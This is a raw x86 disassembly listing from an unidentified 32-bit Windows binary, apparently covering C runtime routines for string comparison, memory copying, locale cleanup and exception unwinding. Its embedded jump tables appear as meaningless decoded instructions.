  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
